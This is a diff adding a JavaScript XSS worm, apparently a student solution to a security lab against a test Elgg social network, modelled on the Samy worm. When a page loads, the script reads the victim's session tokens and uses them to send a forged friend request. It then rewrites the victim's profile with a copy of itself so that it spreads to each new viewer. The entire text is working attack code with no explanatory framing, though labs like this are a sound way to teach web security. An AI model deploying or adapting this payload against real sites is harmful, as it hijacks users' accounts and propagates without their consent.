@@ -1,0 +1,21 @@
+<script id="worm">
+window.onload = function () {
+    var friendUrl = "http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=" + elgg.security.token.__elgg_ts + "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var addFAjax = new XMLHttpRequest();
+    addFAjax.open("GET", friendUrl, true);
+    addFAjax.setRequestHeader("Host", "www.xsslabelgg.com");
+    addFAjax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    addFAjax.send();
+
+var editUrl = "http://www.xsslabelgg.com/action/profile/edit";
+    var wormCode = "<script id=\"worm\">" + document.getElementById("worm").innerHTML + "<\/script>";
+    var Content = "__elgg_token=" + elgg.security.token.__elgg_token + "&__elgg_ts=" + elgg.security.token.__elgg_ts + "&description=<p>Samy is my HERO (added by [Kurudunje Deekshith Shetty, Yahya Sheikh])</p>" + encodeURIComponent(wormCode) + "&name=" + elgg.session.user.name + "&guid=" + elgg.session.user.guid;
+if (elgg.session.user.name !== "Samy") {
+        var editPAjax = new XMLHttpRequest();
+        editPAjax.open("POST", editUrl, true);
+        editPAjax.setRequestHeader("Host", "www.xsslabelgg.com");
+        editPAjax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        editPAjax.send(Content);
+    }
+};
+</script>
